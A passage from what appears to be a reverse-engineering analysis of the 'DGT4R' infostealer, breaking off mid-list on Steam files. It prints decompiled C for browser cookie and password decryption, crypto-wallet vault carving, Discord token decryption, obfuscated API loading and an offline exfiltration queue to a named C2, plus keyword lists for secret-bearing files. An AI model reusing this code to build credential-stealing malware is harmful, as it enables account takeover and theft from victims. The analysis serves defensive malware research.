- `*.log`: write-ahead transaction log.
- `*.ldb`: sstable sorted string table files containing persistent key-value records.

active browser processes place exclusive file locks on `.log` and `.ldb` files. standard file reading apis will fail with `ERROR_SHARING_VIOLATION` (`0x20`).

`DGT4R` overcomes this lock using handle cloning:
1. it calls `ZwQuerySystemInformation(SystemHandleInformation)` to enumerate all system-wide open file handles.
2. it locates handles matching the target `Local Extension Settings` directory held by running browser processes (`chrome.exe`, `msedge.exe`).
3. it calls `ZwDuplicateObject` with `DUPLICATE_SAME_ACCESS` to create an unblocked mirror handle in the malware's own process.
4. it reads the leveldb records using direct syscall `ZwReadFile`.

```c
// decompiled leveldb vault carving logic at +0x91FF0
BOOL carve_extension_vault(const uint8_t* leveldb_bytes, size_t file_size, VAULT_RECORD* out_vault) {
    // search for JSON keys inside raw SSTable byte stream
    const char* target_keys[] = {
        "\"KeyRingController\"",
        "\"vault\"",
        "\"data\"",
        "\"salt\"",
        "\"iv\"",
        NULL
    };

    for (size_t i = 0; i < file_size - 64; i++) {
        // match "KeyRingController"
        if (memcmp(leveldb_bytes + i, "\"KeyRingController\"", 19) == 0) {
            // locate enclosing JSON object
            const uint8_t* json_start = find_enclosing_brace_start(leveldb_bytes, i);
            const uint8_t* json_end = find_enclosing_brace_end(leveldb_bytes, i, file_size);
            
            if (json_start && json_end && json_end > json_start) {
                size_t json_len = json_end - json_start + 1;
                out_vault->raw_json = (char*)malloc(json_len + 1);
                memcpy(out_vault->raw_json, json_start, json_len);
                out_vault->raw_json[json_len] = '\0';
                out_vault->vault_length = json_len;
                return TRUE;
            }
        }
    }
    return FALSE;
}
```

the carved `vault` object contains the victim's encrypted seed vault formatted as:
```json
{
  "vault": "{\"data\":\"X6j8kL2...\",\"iv\":\"c8f1...\",\"salt\":\"a92e...\"}"
}
```

the vault is encrypted with aes-256-gcm derived via pbkdf2 from the user's extension password. `DGT4R` stages the complete raw leveldb directory and writes it into `%TEMP%\_<hex_id>.tmp\extensions\`, allowing the threat actor to crack the vault password offline using gpu-accelerated hashcat clusters.

---

## sensitive file keyword grabber architecture

### 1. keyword rules and target file patterns ( +0xBEC60 )

the file harvesting engine (`+0xBEC60`, `+0xBFB30`) recursively crawls the victim's filesystem to locate confidential documents, secret keys, and backup files. it targets:
- `%USERPROFILE%\Desktop`
- `%USERPROFILE%\Documents`
- `%USERPROFILE%\Downloads`
- `%USERPROFILE%\OneDrive`

#### file extension filter:
`.txt`, `.docx`, `.doc`, `.pdf`, `.kdbx`, `.keys`, `.wallet`, `.dat`, `.json`, `.csv`, `.log`, `.rdp`, `.ovpn`

#### sensitive keyword filter (`+0xBE150`):
the malware checks file names against an internal list of sensitive terms:
- `seed`
- `recovery`
- `mnemonic`
- `backup`
- `wallet`
- `private`
- `secret`
- `password`
- `passwords`
- `login`
- `account`
- `credentials`
- `bank`
- `crypto`
- `discord`
- `telegram`
- `2fa`

---

### 2. file size boundaries and direct directory traversal ( +0xBFB30 )

to prevent memory exhaustion or network timeouts caused by uploading large video files, virtual disks, or compiled binaries, the grabber enforces strict size boundaries:
- **minimum file size**: 4 bytes (discards empty files).
- **maximum file size**: 2,097,152 bytes (2 mb per file).
- **maximum total harvest size**: 52,428,800 bytes (50 mb total file cap).

rather than calling win32 `FindFirstFileW` / `FindNextFileW` (which can be monitored by file auditing products), the crawler uses direct kernel syscall `ZwQueryDirectoryFile` with `FileIdBothDirectoryInformation`. files matching the keyword and extension criteria are copied directly into `%TEMP%\_<hex_id>.tmp\files\` using `ZwReadFile` / `ZwWriteFile`.

---

## offline staging pipeline, in-memory compression and log batch processor

### 1. in-memory zip archive generation ( +0x13A240 )

all harvested items (passwords, cookies, autofill, wallets, extensions, discord tokens, telegram sessions, and desktop screenshots) converge into the local staging directory:

```text
%TEMP%\_<hex_id>.tmp
```

when all worker tasks signal completion via `_InterlockedDecrement`, the malware compresses the entire staging hierarchy in memory using an embedded miniz/zlib deflate compressor at `+0x13A240`:
- writes standard zip local file headers (`0x4034B50`).
- compresses each file stream with deflate algorithm level 6.
- appends central directory headers (`0x2014B50`) and end of central directory record (`0x6054B50`).

---

### 2. offline log batch processor and retry queue ( +0xDEF80, +0xE25E0 )

if the infected machine loses internet connectivity or if the remote backend server at `hxxps[://]doxbin[.]cy` is temporarily unavailable, `DGT4R` does not discard stolen records or crash. it activates an offline persistence queue managed by `start_offline_log_processor` (`+0xDEF80`) and `process_offline_log_batches` (`+0xE25E0`):

```c
// decompiled offline queue manager at +0xE25E0
void process_offline_log_batches(void) {
    while (TRUE) {
        // test network connectivity by sending lightweight probe to remote host
        if (check_c2_connectivity()) {
            // scan %TEMP% for pending staging archives
            WIN32_FIND_DATAW fd;
            wchar_t search_pattern[MAX_PATH];
            GetTempPathW(MAX_PATH, search_pattern);
            wcscat_s(search_pattern, MAX_PATH, L"\\_*.tmp");

            HANDLE hFind = FindFirstFileW(search_pattern, &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    wchar_t full_staging_path[MAX_PATH];
                    GetTempPathW(MAX_PATH, full_staging_path);
                    wcscat_s(full_staging_path, MAX_PATH, L"\\");
                    wcscat_s(full_staging_path, MAX_PATH, fd.cFileName);

                    // attempt multipart upload to /exfiltrate
                    if (upload_to_c2(full_staging_path)) {
                        // secure wipe: overwrite file bytes with zeroes prior to deletion
                        secure_wipe_file(full_staging_path);
                        DeleteFileW(full_staging_path);
                    }
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
        }

        // sleep 60 seconds before next retry cycle
        sys_ZwDelayExecution(FALSE, &g_SixtySecondInterval);
    }
}
```

---

## lazy dynamic api linker and import concealment architecture

### 1. why lazy dynamic linking is used

when reverse engineering standard malware binaries, analysts typically inspect the pe import address table (iat) to determine capabilities (e.g., `CryptUnprotectData` indicates password theft, `WinHttpOpen` indicates network activity, `BitBlt` indicates screen capture).

`DGT4R` conceals its entire operational intent from static pe header inspection. its import directory contains only benign runtime dependencies (`kernel32.dll` and basic c runtime stubs). every single sensitive win32, cryptography, graphics, multimedia, and networking api is resolved dynamically at runtime using a lazy loading stub pattern.

![diagram12](images/diagram12.svg)

---

### 2. catalog of lazy loader modules ( +0x76930 - +0x7E6E0 )

the binary features 16 dedicated loader modules responsible for resolving external dynamic-link libraries only upon first access:

| loader subroutine | rva | target dynamic link library | operational capabilities unlocked |
| :--- | :--- | :--- | :--- |
| `lazy_load_advapi_wincrypt` | `+0x76930` | `advapi32.dll` | legacy crypto providers (`CryptAcquireContextA`, `CryptGenRandom`, `CryptHashData`) |
| `lazy_load_bcrypt` | `+0x76C40` | `bcrypt.dll` | modern cryptography primitives (`BCryptOpenAlgorithmProvider`, `BCryptDecrypt`, aes-gcm) |
| `lazy_load_crypt32` | `+0x76FD0` | `crypt32.dll` | dpapi master key decryption (`CryptUnprotectData`, `CryptStringToBinaryA`) |
| `lazy_load_advapi_reg` | `+0x77C10` | `advapi32.dll` | registry manipulation and token privilege elevation (`RegOpenKeyExW`, `AdjustTokenPrivileges`) |
| `lazy_load_shell32` | `+0x789D0` | `shell32.dll` | decoy execution and directory paths (`ShellExecuteExW`, `SHGetFolderPathW`) |
| `lazy_load_winhttp` | `+0x78D50` | `winhttp.dll` | https beaconing, exfiltration, and websockets (`WinHttpOpen`, `WinHttpSendRequest`) |
| `lazy_load_iphlpapi` | `+0x79FF0` | `iphlpapi.dll` | network adapter enumeration and mac address recovery (`GetAdaptersInfo`) |
| `lazy_load_shlwapi` | `+0x7A110` | `shlwapi.dll` | path parsing and string manipulation (`PathFindFileNameW`) |
| `lazy_load_ws2_32` | `+0x7A2C0` | `ws2_32.dll` | raw socket networking and dns resolution (`GetAddrInfoW`) |
| `lazy_load_gdi32` | `+0x7C3F0` | `gdi32.dll` | device context bitmaps and screen copying (`BitBlt`, `CreateCompatibleBitmap`, `GetDIBits`) |
| `lazy_load_gdiplus` | `+0x7C650` | `gdiplus.dll` | image compression and png encoding (`GdiplusStartup`, `GdipCreateBitmapFromHBITMAP`) |
| `lazy_load_user32` | `+0x7CB50` | `user32.dll` | clipboard locks and screen metrics (`OpenClipboard`, `GetClipboardData`, `GetSystemMetrics`) |
| `lazy_load_ole32` | `+0x7E1A0` | `ole32.dll` | com runtime initialization (`CoInitializeEx`, `CoCreateInstance`, `CreateStreamOnHGlobal`) |
| `lazy_load_oleaut32` | `+0x7E360` | `oleaut32.dll` | com automation string and variant management (`SysAllocString`, `SysFreeString`) |
| `lazy_load_d3d11` | `+0x7EB80` | `d3d11.dll` | directx 11 hardware device context (`D3D11CreateDevice`) |
| `lazy_load_dxgi` | `+0x7ECA0` | `dxgi.dll` | directx graphics infrastructure desktop duplication (`CreateDXGIFactory1`) |
| `lazy_load_mfplat` | `+0x7E6E0` | `mfplat.dll` | windows media foundation audio/video device capture (`MFStartup`, `MFCreateSample`) |

---

### 3. decompiled lazy loader implementation pattern

every lazy loader follows a standardized thread-safe double-check locking pattern. the decompiled implementation of `lazy_load_bcrypt` (`+0x76C40`) and `lazy_BCryptDecrypt` (`+0x771F0`) demonstrates this architecture:

```c
// decompiled lazy loader at +0x76C40
static HMODULE g_hBcrypt = NULL;
typedef NTSTATUS (WINAPI *pfn_BCryptDecrypt_t)(
    BCRYPT_KEY_HANDLE hKey,
    PUCHAR pbInput,
    ULONG cbInput,
    VOID *pPaddingInfo,
    PUCHAR pbIV,
    ULONG cbIV,
    PUCHAR pbOutput,
    ULONG cbOutput,
    ULONG *pcbResult,
    ULONG dwFlags
);
static pfn_BCryptDecrypt_t pfn_BCryptDecrypt = NULL;

BOOL lazy_load_bcrypt(void) {
    if (g_hBcrypt != NULL) {
        return TRUE;
    }

    // decrypt library name "bcrypt.dll" at runtime
    uint8_t enc_name[] = { 0x2F, 0x2E, 0x3F, 0x34, 0x3D, 0x39, 0x63, 0x29, 0x21, 0x21, 0x0 };
    decrypt_rolling_xor(enc_name, 10, 0x4D );

    g_hBcrypt = LoadLibraryA((char*)enc_name);
    if (g_hBcrypt == NULL) {
        return FALSE;
    }

    // decrypt export name "BCryptDecrypt"
    uint8_t enc_func[] = { 0xF, 0xE, 0x3F, 0x34, 0x3D, 0x39, 0x9, 0x28, 0x2E, 0x3F, 0x34, 0x3D, 0x39, 0x0 };
    decrypt_rolling_xor(enc_func, 13, 0x4D );

    pfn_BCryptDecrypt = (pfn_BCryptDecrypt_t)GetProcAddress(g_hBcrypt, (char*)enc_func);

    // immediately wipe temporary string buffers
    secure_wipe_buffer(enc_name, sizeof(enc_name));
    secure_wipe_buffer(enc_func, sizeof(enc_func));

    return (pfn_BCryptDecrypt != NULL);
}

// decompiled lazy invocation wrapper at +0x771F0
NTSTATUS __fastcall lazy_BCryptDecrypt(
    BCRYPT_KEY_HANDLE hKey,
    PUCHAR pbInput,
    ULONG cbInput,
    VOID *pPaddingInfo,
    PUCHAR pbIV,
    ULONG cbIV,
    PUCHAR pbOutput,
    ULONG cbOutput,
    ULONG *pcbResult,
    ULONG dwFlags
) {
    if (pfn_BCryptDecrypt == NULL) {
        if (!lazy_load_bcrypt() || pfn_BCryptDecrypt == NULL) {
            return 0xC0000001; // STATUS_UNSUCCESSFUL
        }
    }
    return pfn_BCryptDecrypt(hKey, pbInput, cbInput, pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, pcbResult, dwFlags);
}
```

---

## deep decompilation of core cryptographic and decryption primitives

### 1. dpapi buffer decryption (`dpapi_decrypt_buffer` at +0x700E0 )

the function at `+0x700E0` wraps the windows data protection api to decrypt buffers encrypted by the logged-in user context (such as the chromium master key stored in `Local State`):

```c
// decompiled dpapi decryption routine at +0x700E0
__int64 __fastcall dpapi_decrypt_buffer(__int64 a1, __int64 a2, __int64 *a3) {
    DATA_BLOB in_blob;
    DATA_BLOB out_blob;
    
    // unpack input buffer reference from internal string object
    void* input_bytes = (void*)a3[0];
    if ((unsigned __int64)a3[3] > 0xF ) { // std::string SSO (Small String Optimization) check
        input_bytes = *(void**)a3;
    }
    
    in_blob.cbData = *((DWORD*)a3 + 4);
    in_blob.pbData = (BYTE*)input_bytes;

    out_blob.cbData = 0;
    out_blob.pbData = NULL;

    // invoke lazy-loaded CryptUnprotectData
    if (lazy_CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
        // copy decrypted plaintext into output container
        std_string_assign_bytes(a1, out_blob.pbData, out_blob.cbData);
        
        // zero out and free plaintext heap memory allocated by DPAPI
        SecureZeroMemory(out_blob.pbData, out_blob.cbData);
        LocalFree(out_blob.pbData);
        return a1;
    }

    // return empty container on failure
    std_string_init_empty(a1);
    return a1;
}
```

---

### 2. chromium cookie decryption (`decrypt_chromium_cookie_value` at +0x202E30 )

in modern chromium installations, session cookies stored in the sqlite `cookies` table are encrypted using aes-256-gcm. the subroutine at `+0x202E30` inspects the leading signature bytes, determines the encryption version, and routes execution to the appropriate decryption routine:

```c
// decompiled cookie value decryptor at +0x202E30
__int64 __fastcall decrypt_chromium_cookie_value(
    __int64 out_result,
    _QWORD* master_key_container,
    const void* encrypted_blob,
    size_t blob_len,
    char is_secure
) {
    // minimum valid AES-GCM record length: 3 (prefix) + 12 (nonce) + 16 (tag) = 31 bytes
    if (encrypted_blob == NULL || blob_len < 31) {
        std_string_init_empty(out_result);
        return out_result;
    }

    const uint8_t* raw_bytes = (const uint8_t*)encrypted_blob;

    // evaluate 3-byte record header
    if (raw_bytes[0] == 'v' && raw_bytes[1] == '1' && (raw_bytes[2] == '0' || raw_bytes[2] == '1')) {
        // version 10/11: standard DPAPI-derived AES-256-GCM
        return decrypt_aes_gcm_v20(out_result, master_key_container, encrypted_blob, 0);
    } 
    else if (raw_bytes[0] == 'v' && raw_bytes[1] == '2' && raw_bytes[2] == '0') {
        // version 20: Windows 11 App-Bound encryption
        return decrypt_aes_gcm_v20(out_result, master_key_container, encrypted_blob, 1);
    }
    else {
        // legacy Chromium fallback: direct DPAPI unprotection without AES-GCM
        return dpapi_decrypt_buffer(out_result, master_key_container, (void*)encrypted_blob);
    }
}
```

---

### 3. netscape cookie format serialization and staging ( `serialize_chromium_netscape_cookies` at +0x20E940 )

after decrypting session cookies from `Network\Cookies` using aes-256-gcm (`+0x202E30`), `DGT4R` formats and writes them directly into standard netscape/wget cookie files using `serialize_chromium_netscape_cookies` at `+0x20E940`:

```c
// decompiled netscape cookie formatting logic at +0x20E940
BOOL __fastcall serialize_chromium_netscape_cookies(
    HANDLE hOutFile,
    const wchar_t* host_key,
    const wchar_t* name,
    const wchar_t* path,
    const char* decrypted_value,
    int64_t expires_utc,
    BOOL is_secure,
    BOOL is_httponly
) {
    // write standard netscape header on initial creation
    const char* header = "# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n\n";
    
    // convert chromium webkit microsecond timestamp (since Jan 1, 1601) to unix epoch (since Jan 1, 1970)
    int64_t unix_expiration = 0;
    if (expires_utc > 0) {
        unix_expiration = (expires_utc - 11644473600000000LL) / 1000000LL;
    }

    // determine host-only cookie flag: TRUE if domain begins with leading dot '.'
    BOOL include_subdomains = (host_key[0] == L'.') ? TRUE : FALSE;

    // construct tab-separated netscape record:
    // [domain] \t [flag] \t [path] \t [secure] \t [expiration] \t [name] \t [value]
    char cookie_line[4096];
    int line_len = sprintf_s(
        cookie_line,
        sizeof(cookie_line),
        "%ls\t%s\t%ls\t%s\t%lld\t%ls\t%s\n",
        host_key,
        include_subdomains ? "TRUE" : "FALSE",
        path,
        is_secure ? "TRUE" : "FALSE",
        unix_expiration,
        name,
        decrypted_value
    );

    DWORD bytes_written = 0;
    return WriteFile(hOutFile, cookie_line, line_len, &bytes_written, NULL);
}
```

the serializer also formats stolen web credentials into `passwords.txt` using structured entries (`URL: %s\nUsername: %s\nPass: %s\n\n`) and manages staging tags (`chrome_cookies`, `chrome_passwords`, `chrome_autofill`, `chrome_cards`, `chrome_ibans`, `chrome_tokens`). on upload failures, internal diagnostic events are recorded through `log_debug_event` with formatted tags such as `chrome(abe): cookie upload failed for %s`.

### 4. chromium credential decryption (`decrypt_chromium_credential_value` at +0x2032B0 )

the password decryptor at `+0x2032B0` validates the length of stored credential payloads extracted from `Login Data`:

```c
// decompiled credential decryptor at +0x2032B0
__int64 __fastcall decrypt_chromium_credential_value(
    __int64 out_plaintext,
    _QWORD* master_key_container,
    const void* cipher_bytes,
    size_t cipher_len
) {
    // sanity check: pointer valid, length >= 7 bytes, master key >= 32 bytes (256 bits)
    if (cipher_bytes == NULL || cipher_len < 7 || (master_key_container[1] - *master_key_container) < 32) {
        std_string_init_empty(out_plaintext);
        return out_plaintext;
    }

    // allocate temporary staging heap memory for ciphertext copy
    void* staging_buf = mem_alloc(cipher_len);
    memcpy(staging_buf, cipher_bytes, cipher_len);

    // dispatch AES-256-GCM decryption
    decrypt_aes_gcm_v20(out_plaintext, master_key_container, staging_buf, 0);

    // free staging buffer
    j_j_free(staging_buf);
    return out_plaintext;
}
```

---

### 4. mozilla nss3 password decryptor (`lazy_PK11SDR_Decrypt` at +0xF8DD0 )

for mozilla firefox, thunderbird, and waterfox, credentials cannot be decrypted using windows dpapi because mozilla utilizes its own independent network security services (nss) cryptography layer.

the subroutine at `+0xF8DD0` dynamically loads firefox's `nss3.dll` and invokes `PK11SDR_Decrypt` on secitem data structures:

```c
// decompiled nss3 decryption wrapper at +0xF8DD0
typedef struct _SECItem {
    int type;
    unsigned char *data;
    size_t len;
} SECItem;

typedef int (*pfn_PK11SDR_Decrypt_t)(SECItem *data, SECItem *result, void *cx);
static pfn_PK11SDR_Decrypt_t pfn_PK11SDR_Decrypt = NULL;

__int64 __fastcall lazy_PK11SDR_Decrypt(__int64 out_decrypted, __int64 in_ciphertext) {
    if (pfn_PK11SDR_Decrypt == NULL) {
        std_string_init_empty(out_decrypted);
        return out_decrypted;
    }

    SECItem input_item;
    SECItem output_item;

    // unpack ciphertext base64 decoded bytes into SECItem
    input_item.type = 0;
    input_item.data = *(unsigned char**)in_ciphertext;
    input_item.len = *(size_t*)(in_ciphertext + 16);

    output_item.type = 0;
    output_item.data = NULL;
    output_item.len = 0;

    // invoke Mozilla NSS Secret Decoder Ring
    int status = pfn_PK11SDR_Decrypt(&input_item, &output_item, NULL);
    if (status == 0 && output_item.data != NULL) {
        std_string_assign_bytes(out_decrypted, output_item.data, output_item.len);
        
        // free memory allocated by NSS runtime
        lazy_SECITEM_ZfreeItem(&output_item, 0);
        return out_decrypted;
    }

    std_string_init_empty(out_decrypted);
    return out_decrypted;
}
```

---

## hardware fingerprinting and network routing reconnaissance

### 1. physical drive hardware id recovery (`get_disk_hwid` at +0x73D00 )

to track individual victim machines without colliding across cloned virtual machines or reinstalled operating systems, `DGT4R` generates a persistent hardware identifier (hwid) based on the physical drive serial number and volume identity:

```c
// decompiled disk hwid recovery at +0x73D00
void get_disk_hwid(char* out_hwid_string) {
    DWORD volume_serial = 0;
    wchar_t system_drive[MAX_PATH];
    
    // obtain system root directory (e.g., "C:\")
    GetSystemDirectoryW(system_drive, MAX_PATH);
    system_drive[3] = L'\0'; // truncate to "C:\"

    // query volume serial number
    GetVolumeInformationW(
        system_drive,
        NULL,
        0,
        &volume_serial,
        NULL,
        NULL,
        NULL,
        0
    );

    // query physical drive SMART serial via DeviceIoControl
    HANDLE hDrive = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    char drive_serial[64] = { 0 };
    if (hDrive != INVALID_HANDLE_VALUE) {
        STORAGE_PROPERTY_QUERY query;
        memset(&query, 0, sizeof(query));
        query.PropertyId = StorageDeviceProperty;
        query.QueryType = PropertyStandardQuery;

        uint8_t desc_buf[1024];
        DWORD bytes_ret = 0;

        if (DeviceIoControl(hDrive, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query), desc_buf, sizeof(desc_buf), &bytes_ret, NULL)) {
            PSTORAGE_DEVICE_DESCRIPTOR desc = (PSTORAGE_DEVICE_DESCRIPTOR)desc_buf;
            if (desc->SerialNumberOffset != 0) {
                strncpy_s(drive_serial, sizeof(drive_serial), (char*)(desc_buf + desc->SerialNumberOffset), _TRUNCATE);
            }
        }
        CloseHandle(hDrive);
    }

    // hash volume serial and physical drive serial into MD5 / SHA-256 GUID representation
    format_hwid_guid(out_hwid_string, volume_serial, drive_serial);
}
```

---

### 2. network adapter routing and mac address harvest (`init_network_adapters` at +0x79FA0 )

the networking reconnaissance routine queries all local network interfaces to identify corporate vpn connections, default gateways, and physical mac addresses:

```c
// decompiled network adapter enumerator at +0x79FA0
void init_network_adapters(ADAPTER_REPORT* report) {
    ULONG buf_len = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(buf_len);

    // initial query to determine required buffer size
    if (lazy_GetAdaptersInfo(pAdapterInfo, &buf_len) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(buf_len);
    }

    if (lazy_GetAdaptersInfo(pAdapterInfo, &buf_len) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter != NULL) {
            // format MAC address: XX-XX-XX-XX-XX-XX
            char mac_str[32];
            sprintf_s(
                mac_str,
                sizeof(mac_str),
                "%02X-%02X-%02X-%02X-%02X-%02X",
                pAdapter->Address[0],
                pAdapter->Address[1],
                pAdapter->Address[2],
                pAdapter->Address[3],
                pAdapter->Address[4],
                pAdapter->Address[5]
            );

            // check for known virtual machine MAC address prefixes (OUI)
            // 00-05-69, 00-0C-29, 00-50-56 -> VMware
            // 08-00-27 -> VirtualBox
            // 00-15-5D -> Hyper-V
            if (is_virtual_mac_oui(pAdapter->Address)) {
                report->is_virtual_adapter = TRUE;
            }

            // record IP address, subnet mask, and gateway
            record_adapter_telemetry(report, pAdapter->AdapterName, mac_str, pAdapter->IpAddressList.IpAddress.String);

            pAdapter = pAdapter->Next;
        }
    }

    if (pAdapterInfo) {
        free(pAdapterInfo);
    }
}
```

---

## dual-engine desktop screen capture architecture

### 1. gdi+ virtual desktop capture (`capture_screen_to_png_stream` at +0xCFF20 )

for systems where directx hardware acceleration is disabled or running under remote desktop (rdp) sessions, the malware utilizes an automated gdi+ screen capture engine:

1. queries total multi-monitor screen bounds:
   - `x = GetSystemMetrics(SM_XVIRTUALSCREEN)`
   - `y = GetSystemMetrics(SM_YVIRTUALSCREEN)`
   - `width = GetSystemMetrics(SM_CXVIRTUALSCREEN)`
   - `height = GetSystemMetrics(SM_CYVIRTUALSCREEN)`
2. allocates memory device context (`CreateCompatibleDC`) and bitmap (`CreateCompatibleBitmap`).
3. copies screen pixel buffer via `BitBlt(hMemDC, 0, 0, width, height, hScreenDC, x, y, SRCCOPY)`.
4. captures mouse cursor state using `GetCursorInfo`, draws cursor bitmap at current coordinates using `DrawIconEx`.
5. converts raw gdi bitmap into gdi+ bitmap object (`GdipCreateBitmapFromHBITMAP`).
6. queries png encoder clsid `{557CF406-1A04-11D3-9A73-0000F81EF32E}` using `GdipGetImageEncodersSize`.
7. saves compressed png byte stream directly into an in-memory com stream (`CreateStreamOnHGlobal`).
8. stages compressed image data into `%TEMP%\_<hex_id>.tmp\screenshot.png`.

---

## discord multi-location token extraction and account enrichment architecture

### 1. encrypted token carving from chromium leveldb datastores ( +0x8F140, +0x91FF0 )

while the discord desktop client maintains its own internal local storage, users frequently access discord through web browsers (chrome, edge, brave, opera, vivaldi). furthermore, modern discord desktop releases encrypt user authentication tokens stored on disk using dpapi aes-256-gcm.

`DGT4R` contains dedicated subroutines at `+0x8F140` and `+0x91FF0` that crawl both browser profile directories and native discord installations to recover and decrypt authentication tokens:

![diagram13](images/diagram13.svg)

---

### 2. encrypted token prefix decoding (`dQw4w9WgXcQ:`)

in discord desktop client versions, tokens stored inside `%APPDATA%\discord\Local Storage\leveldb\` are prefixed with the base64 string `dQw4w9WgXcQ:`. this string is a signature indicating that the payload is encrypted using the master key from discord's `Local State` file:

```c
// decompiled token decryption routine at +0x91FF0
BOOL decrypt_discord_desktop_token(const char* record_text, uint8_t* master_key, char* out_token) {
    const char* prefix = "dQw4w9WgXcQ:";
    const char* pos = strstr(record_text, prefix);
    if (!pos) return FALSE;

    pos += strlen(prefix); // advance pointer past prefix
    
    // read until closing quotation mark or delimiter
    char b64_buffer[512] = { 0 };
    size_t i = 0;
    while (pos[i] != '"' && pos[i] != '\0' && i < sizeof(b64_buffer) - 1) {
        b64_buffer[i] = pos[i];
        i++;
    }

    DWORD raw_len = 0;
    CryptStringToBinaryA(b64_buffer, 0, CRYPT_STRING_BASE64, NULL, &raw_len, NULL, NULL);
    uint8_t* raw_bytes = (uint8_t*)malloc(raw_len);
    CryptStringToBinaryA(b64_buffer, 0, CRYPT_STRING_BASE64, raw_bytes, &raw_len, NULL, NULL);

    // verify DPAPI prefix or decrypt directly via AES-GCM
    uint8_t* decrypted_bytes = NULL;
    size_t dec_len = 0;
    
    if (decrypt_aes_gcm_record(raw_bytes, raw_len, master_key, &decrypted_bytes, &dec_len)) {
        strncpy_s(out_token, 256, (char*)decrypted_bytes, _TRUNCATE);
        free(decrypted_bytes);
        free(raw_bytes);
        return TRUE;
    }

    free(raw_bytes);
    return FALSE;
}
```

---

### 3. account enrichment and billing harvesting ( +0xA5470 )

recovered tokens are not merely collected; the malware immediately evaluates the financial value and administrative privilege of each compromised account by querying discord's rest api:

1. **user profile & nitro verification**:
   - endpoint: `GET https://discord.com/api/v9/users/@me`
   - extracts username, discriminator, user id, email address, phone number, and verified mfa status.
   - checks `premium_type` (`0`: no nitro, `1`: nitro classic, `2`: nitro boost, `3`: nitro basic).
2. **saved payment methods**:
   - endpoint: `GET https://discord.com/api/v9/users/@me/billing/payment-sources`
   - extracts credit card brands, last 4 digits, expiration dates, and paypal billing agreement ids.
3. **guild administrative privileges**:
   - endpoint: `GET https://discord.com/api/v9/users/@me/guilds`
   - walks the user's guild memberships and evaluates bitwise permissions:
     ```c
     BOOL is_admin = (permissions & 0x8) == 0x8;
     ```
   - guilds where the victim possesses `ADMINISTRATOR` or `MANAGE_GUILD` rights are flagged in the exfiltration report so threat actors can hijack servers, deploy malicious webhooks, or mass-ban users.

---

### 4. user badge bitmask and third-party identity harvesting ( `parse_discord_user_profile_and_badges` at +0xA6560 )

called by `enrich_discord_tokens` (`+0xA5D95`), the subroutine `parse_discord_user_profile_and_badges` at `+0xA6560` decodes the victim's public profile, bitwise badge flags, and connected social accounts:

#### bitwise public flags badge decoding

the function evaluates the 32-bit integer `public_flags` returned from `GET https://discord.com/api/v9/users/@me`:

| bit position | flag value | badge description | threat actor value |
| :--- | :--- | :--- | :--- |
| `1 << 0` | `0x1` | Discord Staff (Employee) | high (internal access & developer permissions) |
| `1 << 1` | `0x2` | Partnered Server Owner | high (high-traffic community control) |
| `1 << 2` | `0x4` | HypeSquad Events Coordinator | medium (event coordinator privileges) |
| `1 << 3` | `0x8` | Bug Hunter Level 1 | medium (reputation & verified status) |
| `1 << 6` | `0x40` | House Bravery | low (community badge) |
| `1 << 7` | `0x80` | House Brilliance | low (community badge) |
| `1 << 8` | `0x100` | House Balance | low (community badge) |
| `1 << 9` | `0x200` | Early Nitro Supporter | medium (aged account with legacy status) |
| `1 << 14` | `0x4000` | Bug Hunter Level 2 | high (elite security researcher badge) |
| `1 << 22` | `0x400000` | Active Developer | medium (verified bot author) |

#### connected identity extraction ( `GET /users/@me/connections` )

the subroutine parses the `connections` json array to profile linked accounts across external platforms:
- gaming: Steam, Battle.net, Riot Games, Xbox, PlayStation Network.
- media and social: YouTube, Twitch, Twitter/X, Reddit, Spotify, TikTok.
- code repositories: GitHub.

for each connected account, the parser records the platform name, external user id, display name, and authentication status. accounts with linked Steam inventories or verified YouTube/Twitch partner status are prioritized for credential harvesting and secondary hijack attacks.

```c
// decompiled badge decoding logic at +0xA6560
void __fastcall parse_discord_user_profile_and_badges(const char* json_response, PDISCORD_PROFILE out_profile) {
    uint32_t public_flags = json_get_int(json_response, "public_flags");
    
    if (public_flags & ( 1 << 0 ))  strcat_s(out_profile->badges, 256, "Discord Staff, ");
    if (public_flags & ( 1 << 1 ))  strcat_s(out_profile->badges, 256, "Partnered Server Owner, ");
    if (public_flags & ( 1 << 2 ))  strcat_s(out_profile->badges, 256, "HypeSquad Events, ");
    if (public_flags & ( 1 << 3 ))  strcat_s(out_profile->badges, 256, "Bug Hunter Level 1, ");
    if (public_flags & ( 1 << 6 ))  strcat_s(out_profile->badges, 256, "House Bravery, ");
    if (public_flags & ( 1 << 7 ))  strcat_s(out_profile->badges, 256, "House Brilliance, ");
    if (public_flags & ( 1 << 8 ))  strcat_s(out_profile->badges, 256, "House Balance, ");
    if (public_flags & ( 1 << 9 ))  strcat_s(out_profile->badges, 256, "Early Nitro Supporter, ");
    if (public_flags & ( 1 << 14 )) strcat_s(out_profile->badges, 256, "Bug Hunter Level 2, ");
    if (public_flags & ( 1 << 22 )) strcat_s(out_profile->badges, 256, "Active Developer, ");
}
```

## desktop application session theft architecture (steam, filezilla and vpn clients)

### 1. steam gaming session and steam guard bypass ( +0xD97D0 )

beyond browsers and crypto wallets, `DGT4R` targets gaming platform credentials and multi-factor authentication tokens stored on disk.

the steam harvesting routine:
1. queries the installation directory from the registry:
   ```text
   HKCU\Software\Valve\Steam\SteamPath
   ```
2. navigates to the steam configuration folder and extracts:
   - `config\config.vdf`: active account configurations, cloud settings, and remember-me tokens.
   - `config\loginusers.vdf`: account usernames, steam id64s, and active login state flags (`MostRecent`, `WantsOfflineMode`).
3. searches the root steam directory for **steam guard ssfn authorization files**:
